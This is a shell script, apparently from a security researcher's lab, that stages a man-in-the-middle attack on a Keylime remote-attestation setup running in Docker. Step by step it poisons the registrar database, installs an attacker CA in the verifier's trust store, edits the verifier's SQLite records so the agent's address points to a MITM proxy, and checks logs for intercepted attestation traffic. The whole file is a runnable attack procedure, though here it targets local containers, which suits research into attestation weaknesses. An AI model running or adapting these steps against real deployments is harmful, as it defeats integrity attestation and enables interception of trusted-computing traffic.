#!/bin/sh

# STEP 1: Go to the Keylime directory
echo "Going to Keylime directory..."
cd /home/shubhgupta/keylime
echo "Current directory: $(pwd)\n"

# STEP 2: Go to the keylime-attack-2 branch in the repo
echo "Switching to keylime-attack-2 branch..."
git checkout keylime-attack-2
echo "Switched to branch: $(git branch --show-current)\n\n"

# STEP 3: Stop and remove existing containers
echo "Stopping and removing existing Keylime containers..."
docker stop keylime-agent keylime-verifier keylime-registrar keylime-mitm-verifier 2>/dev/null || true
docker rm keylime-agent keylime-verifier keylime-registrar keylime-mitm-verifier 2>/dev/null || true
echo "Existing containers stopped and removed.\n\n"

# STEP 4: Start the Keylime services
echo "Starting Keylime services using Docker Compose..."
docker compose up -d registrar verifier agent mitm-verifier
echo "\n\n"

# STEP 5: Wait for agent registration
sleep 30

# STEP 6: Poison registrar database FIRST
echo "Poisoning registrar database..."
docker exec -it keylime-registrar python3 /poison_registrar.py
echo "\n\n"

# STEP 7: Add agent to verifier (will use real hostname initially)
echo "Adding agent to verifier..."
docker exec -it keylime-verifier keylime_tenant -c delete -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000 2>/dev/null || true
docker exec -it keylime-verifier keylime_tenant -c add -t keylime-agent -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
sleep 5
echo "\n\n"

# STEP 7.5: Install attacker CA in verifier's trust store
echo "Installing attacker CA in verifier's trust store..."
docker exec -it keylime-verifier sh -c "
  cp /etc/attacker_certs/mitm_server.crt /usr/local/share/ca-certificates/attacker-ca.crt
  update-ca-certificates
"
echo "\n\n"

# STEP 8: Poison verifier database (UPDATE only, don't delete yet)
echo "Poisoning verifier database..."
docker exec -it keylime-verifier python3 -c "
import sqlite3
conn = sqlite3.connect('/var/lib/keylime/cv_data.sqlite')
cursor = conn.cursor()
cursor.execute('''UPDATE verifiermain SET ip = \"mitm-verifier\" WHERE agent_id = \"d432fbb3-d2f1-4a97-9ef7-75bd81c00000\"''')
conn.commit()
print(f'Updated {cursor.rowcount} entries')
cursor.execute('SELECT agent_id, ip, port FROM verifiermain WHERE agent_id = \"d432fbb3-d2f1-4a97-9ef7-75bd81c00000\"')
print('Verification:', cursor.fetchall())
conn.close()
"
echo "\n\n"

# STEP 9: Restart verifier to reload from poisoned database (DON'T delete agent first)
echo "Restarting verifier to reload database..."
docker restart keylime-verifier
sleep 20
echo "\n\n"

# STEP 10: Re-poison AGAIN after restart (in case verifier overwrote it)
echo "Re-poisoning verifier database after restart..."
docker exec -it keylime-verifier python3 -c "
import sqlite3
conn = sqlite3.connect('/var/lib/keylime/cv_data.sqlite')
cursor = conn.cursor()
cursor.execute('''UPDATE verifiermain SET ip = \"mitm-verifier\" WHERE agent_id = \"d432fbb3-d2f1-4a97-9ef7-75bd81c00000\"''')
conn.commit()
print(f'Updated {cursor.rowcount} entries')
cursor.execute('SELECT agent_id, ip, port FROM verifiermain WHERE agent_id = \"d432fbb3-d2f1-4a97-9ef7-75bd81c00000\"')
print('Current DB state:', cursor.fetchall())
conn.close()
"
echo "\n\n"

# STEP 11: Delete agent to force verifier to reload from poisoned DB
echo "Deleting agent to clear verifier's in-memory cache..."
docker exec -it keylime-verifier keylime_tenant -c delete -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
sleep 2
echo "\n\n"

# STEP 12: Re-add agent (verifier will read poisoned IP from registrar)
echo "Re-adding agent (verifier should query poisoned registrar)..."
docker exec -it keylime-verifier keylime_tenant -c add -t mitm-verifier -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
sleep 10
echo "\n\n"

# STEP 13: Verify database persistence
echo "Verifying poisoned database after re-add..."
docker exec -it keylime-verifier python3 -c "
import sqlite3
conn = sqlite3.connect('/var/lib/keylime/cv_data.sqlite')
cursor = conn.cursor()
cursor.execute('SELECT agent_id, ip, port, operational_state FROM verifiermain WHERE agent_id = \"d432fbb3-d2f1-4a97-9ef7-75bd81c00000\"')
result = cursor.fetchall()
print('Database state:', result)
conn.close()
"
echo "\n\n"

# STEP 14: Check verifier logs for MITM connection attempts
echo "Checking verifier logs for MITM traffic..."
docker logs keylime-verifier 2>&1 | grep -E "(mitm|connection|attestation)" | tail -30
echo "\n\n"

# STEP 15: Check MITM proxy logs
echo "Checking MITM proxy logs for intercepted traffic..."
docker logs keylime-mitm-verifier 2>&1 | tail -50
echo "\n\n"

# STEP 16: Check agent status
echo "Final status check..."
docker exec -it keylime-verifier keylime_tenant -c status -u d432fbb3-d2f1-4a97-9ef7-75bd81c00000
echo "\n\n"